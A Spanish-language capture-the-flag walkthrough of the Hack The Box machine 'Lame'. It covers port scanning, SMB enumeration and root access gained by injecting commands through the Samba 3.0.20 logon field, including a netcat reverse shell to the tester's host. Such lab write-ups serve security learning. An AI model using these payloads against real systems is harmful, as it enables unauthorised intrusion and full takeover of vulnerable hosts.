## Información maquina

![img](./img/lame/Pasted%20image%2020240715155613.png)

| **Parámetros** | **Características**                              |
| -------------- | ------------------------------------------------ |
| OS             | Linux                                            |
| Dificultad     | Easy                                             |
| Creador        | ch4p                                             |
| Link           | [Lame](https://www.hackthebox.com/machines/lame) |

## Skill

* Identificación de servicios vulnerables
* Explotación de Samba

## Introducción

En esta maquina vamos a ver como se podría explotar para poder tener los privilegios de administrador del sistema, con lo que vamos a reconocer los diferentes puertos de la maquina y luego buscar alguna vulnerabilidad que nos pueda dar acceso a la maquina.

## Requisitos previos

Vamos a crear unos directorios de trabajo, para poder manejar mucho mejor la información que vamos obteniendo y manteniendo un orden, con la ejecución de los siguiente comandos.

```bash
> mkdir 1.recon 2.vulns 3.tools 4.credentials 5.other
> export ip="10.10.10.3"
```

Ya configurada las opciones realizamos un envío de una traza ICMP para comprobar la conectividad con la maquina, y con lo cual observamos que ya tenemos conectividad y que tiene un `ttl=63` que hace perteneciente a una maquina con sistema operativo Linux.

![img](./img/lame/Pasted%20image%2020240715161017.png)

## Reconocimiento

Realizamos ahora un reconocimiento de los puertos que tenga abierta esta maquina, con la ejecución del siguiente comando.

```bash
sudo nmap -p- --open --min-rate 5000 -Pn -n -sS -vvv $ip -oN preScan
```

El escaneo nos arrojo que están abierto los siguiente puertos donde, se pueden observar que son los puerto `21,22,139,445,3632`, pertenecientes a sus respectivos servicios.

```bash
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.11s latency).
Scanned at 2024-07-15 17:13:39 EDT for 27s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63
```

Realizamos el siguiente paso donde vamos a observar algunos script y vulnerabilidades que pueden tener estos puertos por los cuales se logre tener acceso y realizamos el siguiente comando.

```bash
sudo nmap -sCV -p21,22,139,445,3632 $ip -oN scan
```

Donde se tiene mas especificaciones sobre los servicios y las versiones que están corriendo por estos puertos.

```bash
Nmap scan report for 10.10.10.3
Host is up (0.11s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m22s, deviation: 2h49m47s, median: 18s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-07-15T17:17:56-04:00
```

## Enumeración por FTP

Se puede observar que por el puerto 21, esta corriendo un servicio de `ftp` y que tiene acceso con el usuario `Anonymous` que es un usuario que no suele pedir credenciales de acceso, con lo cual podemos observar una primera instancia si se puede recolectar información a través de este puerto.

![img](./img/lame/Pasted%20image%2020240715163110.png)

Se observa que por el puerto de ftp no tenemos ningún archivo que nos puede servir para poder encontrar algo de información, entonces procedemos a reconocer el siguiente puerto.

## Enumeración por SMB

Procedemos a realizar una análisis por el puertos que esta corriendo samba que son los puertos 139, 445 y vamos a utlizar una herramienta que viene instalada en Kali Linux y es `smbmap` y realizamos el siguiente comando para enumerar alguna vulnerabilidad.

```bash
smbmap -H $ip
```

![img](./img/lame/Pasted%20image%2020240715164002.png)

Y observamos que el directorio `tmp` es accesible, y podemos leer y escribir dentro de este directorio, con lo que vamos a conectarnos a este recurso, ejecutamos el siguiente comando, y no colocamos ninguna credencial.

```bash
smbclient //$ip/tmp
```

![img](./img/lame/Pasted%20image%2020240715164222.png)

Se logran observar varios archivos, con los que podemos ir analizando cada unos para ver si encontramos algunas información que nos sea relevante para escalar privilegios, pero para este caso estos archivos no van hacer relevantes y vamos a proceder con otro paso que puede que nos ayude a escalar privilegios.

Vamos a buscar alguna vulnerabilidad con la versión de smb, `smbd 3.0.20-Debian`

```bash
searchsploit samba 3.0.20
```

Y logramos obtener algunas vulnerabilidades con esta versión de samba, y lo que se desea hacer con la maquina victima es tener acceso para poder ejecutar comando dentro de esta maquina utilizamos el script de `Command Execution`, vamos a analizar este script para poder ver como se lograría tener el acceso de privilegios.

![img](./img/lame/Pasted%20image%2020240715164837.png)

Vamos a explorar que tiene este código y que nos puede servir de este script de ruby, ejecutando el siguiente comando.

```bash
searchsploit -x unix/remote/16320.rb
```

Se observa que en esa linea de código ejecuta lo siguiente para poder tener acceso de super usuario en la maquina.

![img](./img/lame/Pasted%20image%2020240715165401.png)

Vamos a probar esa vulnerabilidad para comprabar si funciona al realizar la conexion encontrada con **smbmap**.

```bash
smbclient //$ip/tmp
```

Realizamos la siguiente petición para probar si nos funciona el código, realizando un envío de una traza ICMP.

```bash
logon "/=`nohup ping 10.10.14.39`"
```

Y en segundo plano colocamos a escuchar el siguiente comando.

```bash
sudo tcpdump -i tun0 icmp
```

Y como se puede comprobar se tiene ejecución de código remoto a través de la maquina entonces procedemos a explotar esta vulnerabilidad.

![img](./img/lame/Pasted%20image%2020240715170204.png)

Ahora ejecutamos el siguiente comando para poder tener un acceso remoto a la maquina a través de una `revershell`.

```bash
logon "/=`nohup nc -e /bin/sh 10.10.14.39 443`"
```

Y colocamos a escuchar otra shell con el siguiente comando.

```bash
sudo nc -nlvp 443
```

Y se puede observar que ya se tiene colectividad con usuario `root`, se logro tener conectiviad con una revershell.

![img](./img/lame/Pasted%20image%2020240715171530.png)

Se realiza un tratamiento de tty para poder trabajar de una manera mas amigable y realizamos los siguientes comandos en el siguiente orden.

```bash
1. script /dev/null -c bash
2. ctrl + z
3. stty raw -echo; fg
4. reset xterm
6. export TERM=xterm
7. export SHELL=bash
```

Y se puede observar que ya es mas manejable la terminar para proceder a buscar las flags.

![img](./img/lame/Pasted%20image%2020240715172531.png)

Y realizamos la búsqueda de las flag y se encuentra las diferentes direcciones donde podemos ir a buscarlas y terminal la maquina.

![img](./img/lame/Pasted%20image%2020240715172731.png)

## Finalizacion

Se pudo observar que esta maquina logramos obtener privilegios de usuario root a traves de una vulnerabilidad de samba, que nos dejo ejecutar un comando de revershell para obtener este acceso y obtener el acceso completo a la maquina.

![img](./img/lame/Pasted%20image%2020240715173006.png)
